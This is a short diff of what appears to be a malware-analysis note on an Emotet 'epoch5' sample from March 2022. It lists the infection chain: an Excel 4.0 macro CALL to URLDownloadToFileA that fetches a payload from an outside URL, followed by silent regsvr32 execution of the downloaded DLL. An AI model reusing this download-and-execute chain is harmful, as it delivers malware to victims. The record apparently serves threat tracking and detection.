@@ -9,13 +9,13 @@ Emotet 2022 | epoch5 | 18.03.2022 |
 
 Exec >>
 
-EXCEL.EXE /dde "C:\Users\Admin\AppData\Local\Temp\DOCUMENT 16032022.xlsm
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\archivo_68971962.xlsm
 
 =CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://ausnz.net/2010wc/RhAYVPNypjphNNk6J/", "..\wnru.ocx")
 
-C:\Windows\SysWow64\regsvr32.exe -s ..\rfs.dll
+C:\Windows\SysWow64\regsvr32.exe -s ..\wnru.ocx
 
-C:\Windows\SysWOW64\regsvr32.exe /s "C:\Windows\SysWOW64\Ivaqdknbuml\ysoi.szf
+C:\Windows\SysWOW64\regsvr32.exe /s "C:\Windows\SysWOW64\Kobhvg\hcvreyfqk.gbz"
 
 ************************************************************************************************************
 
